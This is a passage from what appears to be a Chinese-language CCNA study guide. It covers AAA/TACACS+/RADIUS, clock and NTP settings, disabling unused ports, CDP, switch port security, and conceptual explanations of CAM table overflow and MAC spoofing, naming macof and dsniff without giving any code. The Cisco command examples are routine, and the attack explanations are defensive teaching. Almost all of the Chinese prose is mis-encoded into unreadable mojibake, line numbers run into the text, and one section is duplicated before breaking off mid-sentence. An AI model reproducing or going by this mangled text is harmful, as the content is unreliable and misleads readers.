Disabledunicast-flood Disabledvmps DisabledTimer interval: 300 secondsInterfaces that will be enabled at the next timeout:Interface Errdisable reason Time left(sec)--------- ----------------- --------------Fa0/0 psecure-violation 193 å¤–éƒ¨è®¤è¯æ–¹å¼ï¼ŒExternal Authentication Methods123456789ä¸æœ¬åœ°å­˜å‚¨ä¸åŒï¼Œä½ å¯ä»¥é‡‡ç”¨ä¸€å°é€šå¸¸è¿è¡Œäº† AAA æˆ– TACACS+ çš„æœåŠ¡å™¨æ¥å­˜å‚¨ç”¨æˆ·åå’Œå£ä»¤ã€‚è¿™ä¹ˆåšçš„ä¼˜åŠ¿åœ¨äºï¼Œä½ æ— éœ€åœ¨æ¯å°è·¯ç”±å™¨å’Œäº¤æ¢æœºä¸Šéƒ½æ‰‹åŠ¨è¾“å…¥ç”¨æˆ·åå’Œå£ä»¤ã€‚è€Œæ˜¯å°†å…¶å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ•°æ®åº“ä¸­ã€‚TACACS+ è¡¨ç¤ºâ€œåŠ å¼ºç‰ˆç»ˆç«¯è®¿é—®æ§åˆ¶å™¨è®¿é—®æ§åˆ¶ç³»ç»Ÿï¼ˆTerminal Access Controller Access Control System Plus, TACACS+ï¼‰â€ã€‚å®ƒæ˜¯ä¸€ä¸ªæ€ç§‘ä¸“æœ‰åè®®ï¼Œä½¿ç”¨ TCP 49 å·ç«¯å£ã€‚TACACS+ æä¾›äº†ç»ç”±ä¸€å°æˆ–å¤šå° TACACS+ ä¸­å¿ƒæœåŠ¡å™¨ï¼Œå¯¹åŒ…å«è·¯ç”±å™¨åŠç½‘ç»œä»‹å…¥æœåŠ¡å™¨ç­‰ç½‘ç»œè®¾å¤‡çš„è®¿é—®æ§åˆ¶ã€‚æ‹¨å…¥ç”¨æˆ·è¿œç«¯è®¤è¯æœåŠ¡ï¼ˆRemote Authentication Dial-In User Service, RADIUSï¼‰, æ˜¯ä¸€å¥—åˆ†å¸ƒå¼ç½‘ç»œå®‰å…¨ç³»ç»Ÿï¼Œç”¨ä»¥ç¡®ä¿ç½‘ç»œè¿œç¨‹è®¿é—®çš„å®‰å…¨æ€§ï¼ŒåŒæ—¶å®ƒåˆæ˜¯ä¸€ä¸ªä½¿ç”¨ UDP çš„å®¢æˆ·ç«¯/æœåŠ¡å™¨åè®®ï¼ˆa client/server protocolï¼‰ã€‚RADIUS æ˜¯å¼€æ”¾æ ‡å‡†ã€‚å¦‚ä½ æ‹¥æœ‰ TACACS+ æˆ–è€… RADIUSï¼Œé‚£ä¹ˆä½ å¯èƒ½å¸Œæœ›å¼€å¯è®¤è¯ã€æˆæƒå’Œè®°è´¦ï¼ˆAuthentication, Authorization, and Accounting, AAAï¼‰ã€‚AAA æ˜¯å®‰è£…åœ¨ä¸€å°æœåŠ¡å™¨ä¸Šçš„ï¼Œå®ƒç›‘æµ‹ç€ç½‘ç»œçš„ä¸€ä¸ªç”¨æˆ·å¸å·æ•°æ®åº“ã€‚ç”¨æˆ·è®¿é—®ã€åè®®ã€è¿æ¥ï¼Œä»¥åŠæ–­å¼€åŸå› ï¼ŒåŠå…¶å®ƒå¾ˆå¤šç‰¹æ€§éƒ½èƒ½è¢«ç›‘æµ‹åˆ°ã€‚è·¯ç”±å™¨å’Œäº¤æ¢æœºå¯è¢«è®¾ç½®ä¸ºåœ¨æŸç”¨æˆ·å°è¯•ç™»å…¥æ—¶æŸ¥è¯¢æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ­¤æ—¶æ¥éªŒè¯ç”¨æˆ·ã€‚CCNA è€ƒè¯•ä¸è¦æ±‚ä½ å»é…ç½®è¿™äº›åè®®ã€‚ è·¯ç”±å™¨æ—¶é’ŸåŠ NTPï¼Œ Router Clock and NTP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354äº¤æ¢æœºä¸Šçš„æ—¶é—´ç»å¸¸è¢«å¿½ç•¥ï¼›ä½†å®ƒå´æ˜¯é‡è¦çš„ã€‚åœ¨ä½ é‡åˆ°å®‰å…¨å…¥ä¾µï¼ˆsecurity violationsï¼‰ã€SNMP é—®é¢˜ï¼ˆSNMP trapsï¼‰, æˆ–è€…äº‹ä»¶è®°å½•æ—¶ï¼Œä¼šç”¨åˆ°æ—¶é—´æˆ³ã€‚å¦‚äº¤æ¢æœºä¸Šçš„æ—¶é—´ä¸æ­£ç¡®ï¼Œå°±ä¼šéš¾äºæ‰¾å‡ºæ—¶é—´å‘ç”Ÿçš„æ—¶é—´ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ä¸‹é¢çš„äº¤æ¢æœºï¼Œå¹¶æ£€æŸ¥ä¸€ä¸‹å®ƒçš„æ—¶é—´ã€‚Switch#show clock*23:09:45.773 UTC Tue Mar 2 1993è¯¥æ—¶é—´æ˜¯ä¸å‡†ç¡®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹ä¸€ä¸‹ã€‚ä½†é¦–å…ˆï¼Œæˆ‘ä»¬è¦è®¾ç½®ä¸€äº›å±æ€§å€¼ã€‚clock timezone CST -6clock summer-time CDT recurringclock summer-time CST recurring 2 Sun Mar 2:00 1 Sun Nov 2:00é¦–å…ˆï¼Œæˆ‘ä»¬è®¾ç½®æ—¶åŒºï¼ˆthe time zoneï¼‰ã€‚æˆ‘æ˜¯ä½äºä¸­éƒ¨æ—¶åŒºï¼ˆthe Central time zoneï¼‰ï¼Œ æ¯” GMT è¦æ—© 6 ä¸ªå°æ—¶ã€‚æ¥ç€å‘Šè¯‰äº¤æ¢æœºå¤ä»¤æ—¶ï¼ˆæ—¶é—´å˜åŒ–ï¼Œthe time changeï¼‰æ˜¯å¾ªç¯çš„ã€‚æœ€åè®¾ç½®å¤ä»¤æ—¶å…·ä½“æ˜¯ä»€ä¹ˆã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¾ç½®æ—¶é—´å’Œæ—¥æœŸäº†ã€‚Switch#clock set 14:55:05 June 19 2007Switch#1d23h: %SYS-6-CLOCKUPDATE: System clock has been updated from 17:26:01 CSTTue Mar 2 1993 to 14:55:05 CST Tue Jun 19 2007, configured from console by console.Switch#show clock14:55:13.858 CST Tue Jun 19 2007è¯·æ³¨æ„ï¼Œæ—¶é’Ÿè®¾ç½®å®åœ¨ä½¿èƒ½æ¨¡å¼ï¼ˆEnable modeï¼‰ï¼Œè€Œä¸æ˜¯é…ç½®æ¨¡å¼ä¸‹ã€‚é™¤äº†æ‰‹åŠ¨è®¾ç½®æ—¶é’Ÿå¤–ï¼Œä½ å¯ä»¥ä½¿ç”¨ç½‘ç»œæ—¶é—´åè®®ï¼ˆNetwork Time Protocol, NTPï¼‰ã€‚å®ƒè®©ä½ å¯å°†äº¤æ¢æœºçš„æ—¶é’Ÿä¸æŸå°åŸå­é’Ÿï¼ˆan atomic clockï¼‰åŒæ­¥ï¼Œä¿è¯éå¸¸ç²¾ç¡®çš„æ—¶é—´ã€‚Switch(config)#ntp server 134.84.84.84 preferSwitch(config)#ntp server 209.184.112.199ä½¿ç”¨ä¸‹é¢çš„ä¸¤ä¸ªå‘½ä»¤ï¼Œä½ å¯ä»¥æŸ¥çœ‹æ—¶é’Ÿæ˜¯å¦å·²ç»å’Œ NTP æºä¿æŒåŒæ­¥ã€‚Switch#show ntp associationsSwitch#show ntp statusåœ¨ç¬¬ 40 å¤©ä¸­ï¼Œæˆ‘ä»¬ä¼šæ¶‰åŠæ›´å¤šæœ‰å…³ NTP çš„å†…å®¹ã€‚å…³é—­æœªç”¨åˆ°çš„é‚£äº›ç«¯å£ï¼ŒShut Down Unused Portsæœªä½¿ç”¨çš„ï¼Œæˆ–è€…è¯´â€œç©ºèµ·çš„â€é‚£äº›æ²¡æœ‰ä»»ä½•ç½‘ç»œè®¾å¤‡çš„ç«¯å£ï¼Œå› ä¸ºæŸäººä¼šæ’å…¥ä¸€æ¡ç½‘çº¿å¹¶å°†æœªæˆæƒè®¾å¤‡è¿æ¥åˆ°ç½‘ç»œï¼Œè€Œå¼•å‘å®‰å…¨å¨èƒã€‚è¿™ä¼šå¯¼è‡´ä¸€äº›å®‰å…¨é—®é¢˜ï¼ŒåŒ…æ‹¬ã€‚ç½‘ç»œæœªèƒ½å¦‚åŒä¸å…¶çš„é‚£æ ·è¿ä½œç½‘ç»œä¿¡æ¯æš´éœ²äºå¤–éƒ¨äººå‘˜è¿™å°±æ˜¯ä¸ºä½•ä½ è¦å…³é—­è·¯ç”±å™¨ã€äº¤æ¢æœºåŠå…¶å®ƒç½‘ç»œè®¾å¤‡ä¸Šï¼Œæ‰€æœ‰æœªä½¿ç”¨ç«¯å£çš„åŸå› ã€‚ä¾æ®å…·ä½“è®¾å¤‡ï¼Œå…³é—­çŠ¶æ€å¯èƒ½æ˜¯ç«¯å£é»˜è®¤çš„çŠ¶æ€ï¼Œä½†ä½ ä»è¦å¯¹æ­¤è¿›è¡ŒéªŒè¯ã€‚è€Œå…³é—­ç«¯å£æ˜¯é€šè¿‡åœ¨æ¥å£é…ç½®æ¨¡å¼ä¸‹ä½¿ç”¨ shutdown å‘½ä»¤å®Œæˆçš„ã€‚Switch#conf tSwitch(config)#int fa0/0Switch(config-if)#shutdownéªŒè¯æŸç«¯å£å¤„äºå…³é—­çŠ¶æ€æœ‰å¤šç§æ–¹æ³•ï¼Œå…¶ä¸€å°±æ˜¯ä½¿ç”¨ show ip interface brief å‘½ä»¤ã€‚Router(config-if)#do show ip interface briefInterface IP-Address OK? Method Status ProtocolFastEthernet0/0 unassigned YES unset administratively down downFastEthernet0/1 unassigned YES unset administratively down downè¯·æ³¨æ„ï¼Œç®¡ç†æ€§å…³é—­çŠ¶æ€å°±æ˜¯è¯´è¯¥ç«¯å£æ˜¯æ‰‹å·¥å…³é—­çš„ã€‚éªŒè¯å…³é—­çŠ¶æ€çš„å¦ä¸€æ–¹æ³•æ˜¯ä½¿ç”¨ show interface å‘½ä»¤ã€‚Router#show interface fa0/0FastEthernet0/0 is administratively down, line protocol is down Hardware is Gt96k FE, address is c200.27c8.0000 (bia c200.27c8.0000) MTU 1500 bytes, BW 10000 Kbit/sec, DLY 1000 usec,......æ€ç§‘å‘ç°åè®®ï¼Œ Cisco Discovery Protocol, CDP æ€ç§‘å‘ç°åè®®ï¼Œ Cisco Discovery Protocol, CDP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970ç°åœ¨æ¥è®¨è®ºæ€ç§‘å‘ç°åè®®æ­£æ˜¯æ—¶å€™ã€‚CDP å› ä¸ºå…¶åœ¨åšå‡ºä»»ä½•é…ç½®ä¹‹å‰ï¼Œå°±æä¾›äº†ä¸€ç§å‘ç°æœ‰å…³ç½‘ç»œè®¾å¤‡ä¿¡æ¯çš„æ–¹æ³•ï¼Œè€Œæ˜¯ä¸€ä¸ªçƒ­é—¨çš„è€ƒè¯•è€ƒç‚¹ã€‚å®ƒæ˜¯ä¸€ç›´éå¸¸æœ‰ç”¨çš„æ•…éšœæ’é™¤å·¥å…·ï¼›ä½†å®ƒåˆå¸¦æ¥äº†å®‰å…¨å¨èƒã€‚CDP æ˜¯ä¸€ä¸ªæ€ç§‘ä¸“æœ‰åè®®ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªè¿è¡Œåœ¨æ€ç§‘è®¾å¤‡ä¸Šã€‚å®ƒæ˜¯ä¸€ç§äºŒå±‚æœåŠ¡, è®¾å¤‡ç”¨å®ƒæ¥é€šå‘Šå’Œæ¥æ”¶é‚£äº›ç›´æ¥è¿æ¥è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯ã€‚IEEE ç‰ˆæœ¬çš„ CDP å«åšé“¾è·¯å±‚å‘ç°åè®®ï¼ˆLink Layer Discovery Protocol, LLDPï¼‰, CCNA å¤§çº²å¹¶ä¸åŒ…å«æ­¤å†…å®¹ã€‚å› ä¸º CDP æ˜¯ä¸€ç§äºŒå±‚æœåŠ¡ï¼Œæ‰€ä»¥å®ƒå¹¶ä¸éœ€è¦é…ç½®æœ‰ IP åœ°å€æ¥äº¤æ¢ä¿¡æ¯ã€‚åªéœ€å¼€å¯æ¥å£å°±è¡Œã€‚å¦‚æœ‰é…ç½® IP åœ°å€ï¼Œè¯¥ IP åœ°å€ä¹Ÿä¼šåŒ…å«è¿› CDP æ¶ˆæ¯ä¸­ã€‚CDP ä½œä¸ºéå¸¸å¼ºå¤§çš„æ•…éšœæ’é™¤å·¥å…·ï¼Œè€ƒè¯•ä¸­è¦æ±‚ä½ æŒæ¡å¦‚ä½•æ¥ä½¿ç”¨å®ƒã€‚å›¾ 4.1 å±•ç¤ºäº† Router 0 çš„ CDP è¾“å‡ºã€‚è¯·è®¾æƒ³ä¸€ä¸‹åœ¨æ²¡æœ‰æ‹“æ‰‘å›¾ï¼ˆtopology diagramï¼‰çš„æƒ…å†µä¸‹ï¼Œä½ è¦å¯¹æ­¤ç½‘ç»œè¿›è¡Œæ•…éšœæ’é™¤çš„æƒ…å½¢ã€‚Router 0 çš„ CDP è¾“å‡ºå›¾ 4.1 -- Router 0 çš„ CDP è¾“å‡ºä¸‹åˆ—é…ç½®è¾“å…¥ï¼Œæ­£æ˜¯å›¾ 4.1 ä¸­çš„ã€‚Router0#show cdp neighborsCapability Codes: R - Router, T - Trans Bridge, B - Source Route Bridge, S - Switch, H -Host, I - IGMP, r - Repeater, P - PhoneDevice ID Local Interface Holdtime Capability Platform PortSwitch Fas 0/0 165 S 2960 Fas 0/1Router Fas 0/1 169 R C1841 Fas 0/0Router0#åœ¨ä¸Šè¿°å‘½ä»¤çš„åé¢åŠ ä¸Š detail å‘½ä»¤ï¼Œä½ å¯ä»¥çœ‹åˆ°æ›´å¤šä¿¡æ¯ã€‚Router0#show cdp neighbors detailDevice ID: SwitchEntry address(es):Platform: cisco 2960, Capabilities: SwitchInterface: FastEthernet0/0, Port ID (outgoing port): FastEthernet0/1Holdtime: 178Version :Cisco IOS Software, C2960 Software (C2960-LANBASE-M), Version 12.2(25)FX, RELEASESOFTWARE (fc1)Copyright (c) 1986-2005 by Cisco Systems, Inc.Compiled Wed 12-Oct-05 22:05 by pt_teamadvertisement version: 2Duplex: full---------------------------Device ID: RouterEntry address(es): IP address : 192.168.1.2Platform: cisco C1841, Capabilities: RouterInterface: FastEthernet0/1, Port ID (outgoing port): FastEthernet0/0Holdtime: 122Version :Cisco IOS Software, 1841 Software (C1841-ADVIPSERVICESK9-M), Version 12.4(15)T1, RELEASESOFTWARE (fc2)Technical Support: http://www.cisco.com/techsupportCopyright (c) 1986-2007 by Cisco Systems, Inc.Compiled Wed 18-Jul-07 04:52 by pt_teamadvertisement version: 2Duplex: fullç°åœ¨ä½ å¯ä»¥çœ‹åˆ° IOS ç‰ˆæœ¬ã€å‹å·ã€IP åœ°å€ä»¥åŠå…¶å®ƒä¿¡æ¯ã€‚è®°ä½ç°åœ¨ä½ ä»æœªåœ¨ Router 0 ä¸Šé…ç½® IP åœ°å€ã€‚å‰é¢æˆ‘ä»¬å·²ç»è®²è¿‡æ€æ ·åœ¨æ•´å°è®¾å¤‡æˆ–ä»…åœ¨æŸä¸ªæ¥å£ä¸Šå…³é—­ CDP äº†ã€‚è€Œå¦ä¸¤ä¸ªæœ‰å…³å‘½ä»¤æ˜¯æ˜¾ç¤ºè®¾å¤‡æœ‰å…³ CDP çš„åè®®ä¿¡æ¯çš„ show cdp å‘½ä»¤ï¼Œä»¥åŠé€šè¿‡è¾“å…¥è®¾å¤‡åç§°æ¥æŸ¥çœ‹æŸå°å…·è®¾å¤‡ä¿¡æ¯çš„ show cdp entry &lt;Router&gt; å‘½ä»¤ã€‚å»ºè®®åœ¨ä»Šå¤©è¦é…ç½®çš„å®éªŒä¸­èŠ±äº›æ—¶é—´ï¼Œæ¥æŸ¥çœ‹ CDP çš„ä¼—å¤šè¾“å‡ºã€‚Router0#show cdpGlobal CDP information: Sending CDP packets every 60 seconds Sending a holdtime value of 180 seconds Sending CDPv2 advertisements is enabledRouter0#show cdp ? entry Information for specific neighbor entry interface CDP interface status and configuration neighbors CDP neighbor entries traffic CDP statistics | Output modifiers &lt;cr&gt; äº¤æ¢æœºç«¯å£å®‰å…¨ï¼ŒSwitch Port Security1234567891011121314ç«¯å£å®‰å…¨ç‰¹æ€§ï¼Œæ˜¯é€šè¿‡é™åˆ¶æŸä¸ªç‰¹å®šç«¯å£æˆ–æ˜¯æ¥å£èƒ½å¤Ÿå­¦ä¹ åˆ°çš„ MAC åœ°å€æ•°ç›®ï¼Œæ¥ä¿æŠ¤äº¤æ¢æœºç«¯å£å®‰å…¨ï¼Œå¹¶æœ€ç»ˆç¡®ä¿å†…å®¹å¯å¯»å€å­˜å‚¨å™¨ï¼ˆContent Addressable Memory, CAMï¼‰è¡¨çš„å®‰å…¨çš„ä¸€é¡¹ï¼ŒCatalyst äº¤æ¢æœºçš„æœ‰åŠ›ç‰¹æ€§ã€‚å…·å¤‡äº†ç«¯å®‰å…¨ç‰¹æ€§ï¼Œäº¤æ¢æœºå°±èƒ½å¤Ÿç»´æŠ¤ä¸€å¼ ç”¨äºæ˜ç¡®å“ªä¸ª MAC åœ°å€ï¼ˆæˆ–å“ªäº›åœ°å€ï¼‰ï¼Œå¯ä»¥æ¥å…¥å“ªäº›æœ¬åœ°äº¤æ¢æœºç«¯å£çš„è¡¨æ ¼ã€‚æ­¤å¤–ï¼Œäº¤æ¢æœºåŒæ ·å¯ä»¥é…ç½®ä¸ºä»…å…è®¸åœ¨ä»»ä½•ç»™å®šçš„ç«¯å£ä¸Šå­¦ä¹ åˆ°æŒ‡å®šæ•°é‡çš„ MAC åœ°å€ã€‚ç«¯å£å®‰å…¨å¦‚å›¾ 4.2 æ‰€ç¤ºã€‚æ³¨ï¼šå…³äºCAMçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒ CAM (Content Addressable Memory) VS TCAM (Ternary Content Addressable Memory)ã€‚&quot;ç«¯å£å®‰å…¨çš„è¿ä½œ&quot;å›¾ 4.2 -- ç«¯å£å®‰å…¨çš„è¿ä½œå›¾ 4.2 å±•ç¤ºäº†åœ¨æŸå° Catalyst äº¤æ¢æœºä¸Šï¼Œé€šè¿‡ç«¯å£å®‰å…¨ç‰¹æ€§é…ç½®çš„ 4 ä¸ªç«¯å£ï¼Œå®ƒä»¬éƒ½åªå…è®¸å•ä¸€ MAC åœ°å€æ¥å…¥ã€‚ä» 1 å·åˆ° 3 å·ç«¯å£è¿æ¥çš„ MAC åœ°å€ä¸ç«¯å£å®‰å…¨æ‰€å…è®¸çš„åœ°å€åŒ¹é…ã€‚åœ¨æ²¡æœ‰å…¶å®ƒè¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œè¿™äº›ä¸»æœºå°±èƒ½å¤Ÿç»ç”±å…¶å„è‡ªäº¤æ¢æœºç«¯å£è½¬å‘æµé‡ã€‚è€Œç«¯å£ 4 ä¸Šæ‰€é…ç½®çš„æ˜¯å…è®¸ AAAA.0000.0004 MAC åœ°å€ï¼Œä½†æ‰€æ¥å…¥çš„ MAC åœ°å€å´æ˜¯ BBBB.0000.0001ã€‚å› ä¸ºä¸»æœº MAC åœ°å€ä¸æ‰€å…è®¸çš„ MAC ä¸ä¸€æ ·ï¼Œç«¯å£å®‰å…¨ï¼ˆport securityï¼‰å°†åœ¨ç«¯å£ä¸Šåšå‡ºå¦‚åŒç®¡ç†å‘˜æ‰€è®¾å®šçš„é€‚å½“åŠ¨ä½œã€‚è¿™äº›æœ‰æ•ˆç«¯å£å®‰å…¨åŠ¨(the valid port security actions)ä½œå°†åœ¨æ¥ä¸‹æ¥çš„éƒ¨åˆ†è¯¦ç»†è¯´æ˜ã€‚ç«¯å£å®‰å…¨ç‰¹æ€§è®¾è®¡ç”¨äºä¿æŠ¤äº¤æ¢å±€åŸŸç½‘ï¼ˆthe switched LANï¼‰å…å—ä¸¤ç§ä¸»è¦çš„æ”»å‡»æ–¹å¼ã€‚è¿™ä¸¤ç§æ–¹å¼åœ¨ä¸‹çš„å°èŠ‚è®²åˆ°ã€‚CAM è¡¨æº¢å‡ºæ”»å‡»ï¼Œ CAM table overflow attacksMAC æ¬ºéª—æ”»å‡»ï¼Œ MAC spoofing attacks CAM è¡¨æº¢å‡ºæ”»å‡»12345678910111213141516171819202122232425262728äº¤æ¢æœºçš„ CAM è¡¨æ˜¯ä¸€äº›å­˜å‚¨ä½ç½®ï¼Œè¿™äº›å­˜å‚¨ä½ç½®åŒ…å«äº†ç‰©ç†ç«¯å£ä¸Šçš„é‚£äº› MAC åœ°å€ï¼ŒåŠå…¶ VLAN å‚æ•°ã€‚äº¤æ¢æœº CAM è¡¨ä¸­åŠ¨æ€å­¦ä¹ åˆ°çš„å†…å®¹ï¼Œæˆ–è€…è¯´ MAC åœ°å€è¡¨ï¼Œå¯é€šè¿‡å‘½ä»¤ show mac-address-table dynamic æŸ¥çœ‹åˆ°ï¼Œå¦‚ä¸‹é¢çš„è¾“å‡ºæ‰€ç¤ºã€‚VTP-Server-1#show mac-address-table dynamic Mac Address Table-------------------------------------------Vlan Mac Address Type Ports---- ----------- -------- ----- 2 000c.cea7.f3a0 DYNAMIC Fa0/1 2 0013.1986.0a20 DYNAMIC Fa0/2 6 0004.c16f.8741 DYNAMIC Fa0/3 6 0030.803f.ea81 DYNAMIC Fa0/4 8 0004.c16f.8742 DYNAMIC Fa0/5 8 0030.803f.ea82 DYNAMIC Fa0/6Total Mac Addresses for this criterion: 6å¦‚åŒæ‰€æœ‰çš„è®¡ç®—è£…ç½®ä¸€æ ·ï¼Œäº¤æ¢æœºçš„å­˜å‚¨èµ„æºä¹Ÿæ˜¯æœ‰é™çš„ã€‚è¿™å°±æ„å‘³ç€ CAM è¡¨çš„å­˜å‚¨ç©ºé—´æ˜¯å›ºå®šçš„ï¼Œå·²åˆ†é…å¥½çš„ã€‚CAM è¡¨æº¢å‡ºæ”»å‡»ï¼ˆCAM table overflow attacksï¼‰å°†æ­¤é™åˆ¶ä½œä¸ºç›®æ ‡ï¼Œç”¨å¤§é‡éšæœºç”Ÿæˆçš„æ— æ•ˆæºåŠç›®çš„ MAC åœ°å€çŒå…¥äº¤æ¢æœºï¼Œç›´åˆ°å¡«æ»¡ CAM è¡¨ï¼Œæ­¤æ—¶äº¤æ¢æœºå°±æ— æ³•æ¥æ”¶æ–°çš„ CAM è¡¨æ¡ç›®äº†ã€‚åœ¨æ­¤æƒ…å†µä¸‹ï¼Œäº¤æ¢æœºæˆä¸ºäº†ä¸€å°é›†çº¿å™¨ï¼Œåªèƒ½å¼€å§‹ç®€å•åœ°å°†æ–°è¿‘æ¥æ”¶çš„å¸§å¹¿æ’­åˆ°å…¶ä¸Šçš„æ‰€æœ‰æ¥å£ï¼ˆåŒä¸€ VLAN ä¸­çš„ï¼‰ï¼Œå°±æ˜¯å°†è¯¥ VLAN å˜æˆäº†ä¸€ä¸ªå¤§çš„å¹¿æ’­åŸŸã€‚å¯¹ CAM è¡¨çš„æ”»å‡»æ˜“äºå¼€å±•ï¼Œå› ä¸ºæœ‰ç€åƒ MACOF åŠ DSNIFF ç­‰å¸¸è§çš„å·¥å…·å¯ç”¨äºå®æ–½è¿™æ ·çš„è¡Œä¸ºã€‚è€Œå¢åŠ  VLANs çš„æ•°ç›®ï¼ˆæ­¤ä¸¾å‡å°‘äº†å¹¿æ’­åŸŸçš„å°ºå¯¸ï¼‰ï¼Œå¯æœ‰åŠ©äºé™ä½ CAM è¡¨æ”»å‡»çš„å½±å“ï¼Œåœ¨äº¤æ¢æœºä¸Šé…ç½®ç«¯å£å®‰å…¨ç‰¹æ€§ï¼Œæ˜¯æ¨èçš„å®‰å…¨æ–¹æ¡ˆã€‚MAC æ¬ºéª—æ”»å‡»ï¼ŒMAC Spoofing AttacksMAC åœ°å€æ¬ºéª—ï¼Œç”¨äºå†’å……æŸä¸ªæº MAC åœ°å€ï¼Œä»¥è¾¾åˆ°æ‰®æ¼”ç½‘ç»œä¸Šçš„å…¶å®ƒä¸»æœºæˆ–è®¾å¤‡çš„ç›®çš„ã€‚å†’å……ï¼ˆspoofingï¼‰å°±æ˜¯ä¼ªè£…æˆæˆ–æ‰®ç€æ˜¯å¹¶éä½ æœ¬äººçš„æŸä¸ªäººã€‚MAC åœ°å€æ¬ºéª—çš„ä¸»è¦ç›®çš„æ˜¯æ‰°ä¹±äº¤æ¢æœºï¼Œä»¤åˆ°å…¶ä»¥ä¸ºæŸå°åŒä¸€ä¸»æœºè¿æ¥åˆ°ä¸¤ä¸ªç«¯å£ä¸Šï¼Œè¿™å°±å¯¼è‡´äº¤æ¢æœºå°è¯•åŒæ—¶å°†å¸§è½¬å‘ç»™å—ä¿¡ä»»çš„ä¸»æœºå’Œæ”»å‡»è€…ã€‚å›¾ 4.3 å±•ç¤ºäº†è¿æ¥4 å°ä¸åŒç½‘ç»œä¸»æœºçš„äº¤æ¢æœºçš„ CAM è¡¨ã€‚&quot;äº¤æ¢æœº CAM è¡¨çš„å»ºç«‹&quot;å›¾ 4.3 ä¸­, äº¤æ¢æœºå…è®¸æ­£å¸¸ï¼Œæ ¹æ® CAM è¡¨æ¡ç›®ï¼Œå®ƒçŸ¥é“è¿æ¥è‡³å…¶ç«¯å£ä¸Šçš„æ‰€æœ‰è®¾å¤‡çš„ MAC åœ°å€ã€‚è€ŒåŸºäºå½“å‰çš„ CAM è¡¨ï¼Œå¦‚ 4 å·ä¸»æœºæƒ³è¦å‘ç»™ 2 å·ä¸»æœºä¸€ä¸ªå¸§ï¼Œäº¤æ¢æœºå°±ä¼šç®€å•åœ°å°†è¯¥å¸§è½¬å‘å‡ºå®ƒçš„ FastEthernet 0/2 æ¥å£ï¼Œè€Œå‰å¾€ 2 å·ä¸»æœºã€‚ç°åœ¨ï¼Œå‡è®¾ 1 å·ä¸»æœºè¢«æŸä¸ªæƒ³è¦æ¥æ”¶æ‰€æœ‰å‘å¾€ 2 å·ä¸»æœºæµé‡çš„æ”»å‡»è€…å…¥ä¾µäº†ã€‚åˆ™ç»ç”± MAC åœ°å€æ¬ºéª—ï¼Œæ”»å‡»è€…ç²¾å¿ƒæ„å»ºå‡ºä½¿ç”¨ 2 å·ä¸»æœºæºåœ°å€çš„ä»¥å¤ªç½‘å¸§ã€‚åœ¨äº¤æ¢æœºæ”¶åˆ°è¯¥å¸§åï¼Œå®ƒè®°ä¸‹è¯¥æºåœ°å€ï¼Œå¹¶é‡å†™ CAM è¡¨ä¸­ 2 å·ä¸»æœºæ‰€å¯¹åº”çš„æ¡ç›®ï¼Œå°†å…¶æŒ‡å‘ FastEthernet 0/1 ç«¯å£ï¼Œè€Œä¸æ˜¯ 2 å·ä¸»æœºæ‰€çœŸæ­£è¿æ¥çš„ FastEthernet 0/2ã€‚æ­¤æ¦‚å¿µå¦‚å›¾ 4.4 æ‰€ç¤ºã€‚ MAC æ¬ºéª—æ”»å‡»ï¼ŒMAC Spoofing Attacks12345678910111213MAC åœ°å€æ¬ºéª—ï¼Œç”¨äºå†’å……æŸä¸ªæº MAC åœ°å€ï¼Œä»¥è¾¾åˆ°æ‰®æ¼”ç½‘ç»œä¸Šçš„å…¶å®ƒä¸»æœºæˆ–è®¾å¤‡çš„ç›®çš„ã€‚å†’å……ï¼ˆspoofingï¼‰å°±æ˜¯ä¼ªè£…æˆæˆ–æ‰®ç€æ˜¯å¹¶éä½ æœ¬äººçš„æŸä¸ªäººã€‚MAC åœ°å€æ¬ºéª—çš„ä¸»è¦ç›®çš„æ˜¯æ‰°ä¹±äº¤æ¢æœºï¼Œä»¤åˆ°å…¶ä»¥ä¸ºæŸå°åŒä¸€ä¸»æœºè¿æ¥åˆ°ä¸¤ä¸ªç«¯å£ä¸Šï¼Œè¿™å°±å¯¼è‡´äº¤æ¢æœºå°è¯•åŒæ—¶å°†å¸§è½¬å‘ç»™å—ä¿¡ä»»çš„ä¸»æœºå’Œæ”»å‡»è€…ã€‚å›¾ 4.3 å±•ç¤ºäº†è¿æ¥4 å°ä¸åŒç½‘ç»œä¸»æœºçš„äº¤æ¢æœºçš„ CAM è¡¨ã€‚&quot;äº¤æ¢æœº CAM è¡¨çš„å»ºç«‹&quot;å›¾ 4.3 ä¸­, äº¤æ¢æœºå…è®¸æ­£å¸¸ï¼Œæ ¹æ® CAM è¡¨æ¡ç›®ï¼Œå®ƒçŸ¥é“è¿æ¥è‡³å…¶ç«¯å£ä¸Šçš„æ‰€æœ‰è®¾å¤‡çš„ MAC åœ°å€ã€‚è€ŒåŸºäºå½“å‰çš„ CAM è¡¨ï¼Œå¦‚ 4 å·ä¸»æœºæƒ³è¦å‘ç»™ 2 å·ä¸»æœºä¸€ä¸ªå¸§ï¼Œäº¤æ¢æœºå°±ä¼šç®€å•åœ°å°†è¯¥å¸§è½¬å‘å‡ºå®ƒçš„ FastEthernet 0/2 æ¥å£ï¼Œè€Œå‰å¾€ 2 å·ä¸»æœºã€‚ç°åœ¨ï¼Œå‡è®¾ 1 å·ä¸»æœºè¢«æŸä¸ªæƒ³è¦æ¥æ”¶æ‰€æœ‰å‘å¾€ 2 å·ä¸»æœºæµé‡çš„æ”»å‡»è€…å…¥ä¾µäº†ã€‚åˆ™ç»ç”± MAC åœ°å€æ¬ºéª—ï¼Œæ”»å‡»è€…ç²¾å¿ƒæ„å»ºå‡ºä½¿ç”¨ 2 å·ä¸»æœºæºåœ°å€çš„ä»¥å¤ªç½‘å¸§ã€‚åœ¨äº¤æ¢æœºæ”¶åˆ°è¯¥å¸§åï¼Œå®ƒè®°ä¸‹è¯¥æºåœ°å€ï¼Œå¹¶é‡å†™ CAM è¡¨ä¸­ 2 